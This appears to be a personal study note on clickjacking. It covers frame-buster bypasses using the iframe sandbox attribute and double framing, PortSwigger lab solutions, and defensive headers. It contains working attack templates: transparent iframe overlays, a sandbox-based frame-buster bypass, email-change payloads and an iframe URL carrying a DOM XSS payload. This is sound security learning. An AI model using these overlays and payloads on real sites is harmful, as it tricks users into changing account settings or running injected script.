# What is clickjacking?
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
![[clickjacking-infographic.svg]]

## How to construct a basic clickjacking attack
`<head>`
`	<style>`
`		#target_website {`
`			position:relative;`
`			width:128px;`
`			height:128px;`
`			opacity:0.00001;`
`			z-index:2;`
`			}`
`		#decoy_website {`
`			position:absolute;`
`			width:300px;`
`			height:400px;`
`			z-index:1;`
`			}`
`	</style>`
`</head>`
`...`
`<body>`
`	<div id="decoy_website">`
`	...decoy web content here...`
`	</div>`
`	<iframe id="target_website" src="https://vulnerable-website.com">`
`	</iframe>`
`</body>`

---
## Frame busting or frame killer or frame breaker scripts
A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:
- check and enforce that the current application window is the main or top window,
- make all frames visible.
- prevent clicking on invisible frames.
- intercept and flag potential clickjacking attacks to the user.

Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the *iframe cannot check whether or not it is the top window* :
`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`
Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

**Here’s a simple example of a frame buster :**
`if (window.top !== window.self) {`
`    window.top.location = window.self.location;`
`}`

This code checks if the current page (`window.self`) is not the topmost frame (`window.top`). If it is not, the page forces the top-level frame to navigate to its location, effectively breaking out of the `iframe`.
## What is the Sandbox Attribute?
The `sandbox` attribute is an HTML attribute used with the `<iframe>` element to apply a restrictive set of permissions to the content loaded within the iframe. It acts like a mini sandbox environment for the iframe, limiting what the content can do.
**Here’s an example :**
`<iframe src="https://example.com" sandbox></iframe>`

When the `sandbox` attribute is applied without any additional values, it imposes strict restrictions:
- Disables JavaScript execution.
- Blocks form submissions.
- Prevents navigation of the top-level browsing context.
- Disables plugins.
You can allow specific permissions by adding values like `allow-scripts`, `allow-same-origin`, etc.

## How the Sandbox Attribute Bypasses Frame Busters
	Frame busters rely on JavaScript to detect whether the page is being loaded inside an iframe. However, the `sandbox` attribute disables or limits the functionality of JavaScript within the iframe. This means that the frame buster script cannot execute or perform actions like navigating the top frame.

## Smart bypass (Double iframe)
If that is the case, search for a location on the victim site that allows you to embed custom iframes. For example, many social media sites allows users to share links on their profile. These features often work by embedding the URL in an iframe to display information and a thumbnail of the link. Other common features that require custom iframes are those that allow you to embed videos, audio, images, and custom advertisements and web page builders.
If you find one of these features, you might be able to bypass clickjacking protection by using the double iframe trick. This trick works by framing your malicious page within a page in the victim’s domain. First, construct a page that frames the victim’s targeted functionality. Then place the entire page in an iframe hosted by the victim site

![[Screenshot 2025-01-11 001000.png]]

This way, both top.location and self.location point to victim.com. The frame-busting code would determine that the innermost victim.com page is framed by another victim.com page within its domain, and therefore deem the framing safe. The intermediary attacker page would go undetected.

## Steps to make Clickjacking happens
Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites.
1. user must be logged in for high impact
2. allow website to be framed


## Labs
* #Portswigger
	1. **Basic clickjacking with CSRF token protection** #APPRENTICE 
		basic clickjacking code
		*code :*
		`<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacked@adel.com"></iframe>`
	2. **Clickjacking with form input data prefilled from a URL parameter** #APPRENTICE 
		basic clickjacking to change email
		*code :*
		`<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
		###### Question : although it is a POST request we email value as a query parameter in the URL how could this benefit us ?
		*the answer is by writing the email value in the URL this allow us to add it as a placeholder on the form and waiting the victim to just submit the form*
	3. **Clickjacking with a frame buster script** #APPRENTICE 
		we add `sandbox="allow-forms"` to allow `iframe`
		*code :*
		`<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
	4. **Exploiting clickjacking vulnerability to trigger DOM-based XSS** #PRACTITIONER 
		write an XSS code in the URL and use clickjacking
		*code :*
		`<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>`
	5. **Multistep clickjacking** #PRACTITIONER 
		two steps for clickjacking
		*code :*
		`<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; }    .firstClick, .secondClick { position:absolute; top:$top_value1; left:$side_value1; z-index: 1; }    .secondClick { top:$top_value2; left:$side_value2; } </style> <div class="firstClick">Test me first</div> <div class="secondClick">Test me next</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`


# Common defenses against clickjacking attacks
1. `X-Frame-Options:` `DENY` or  `SAMEORIGIN` or `allow-from`
	The header provides the website owner with control over the use of `iframes` or objects
2. `Content-Security-Policy:` `frame-ancestors` `'none'` or `'self'`
	none -> no site can `iframe` this page
	self -> this site can `iframe` this page
	`Content-Security-Policy:frame-ancestors:'self' *.example.com`

```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 80
  - item: "Browser"
    user: "Effective against the attack"
    score: 70
  - item: "Server"
    user: "Effective against the attack"
    score: 0
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```

# NOTES
- Clickjacking attacks are not mitigated by the CSRF token
- This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. 

## Attack Scenarios


## Convert Attacks
1. convert self XSS to reflected or stored XSS or DOM-XSS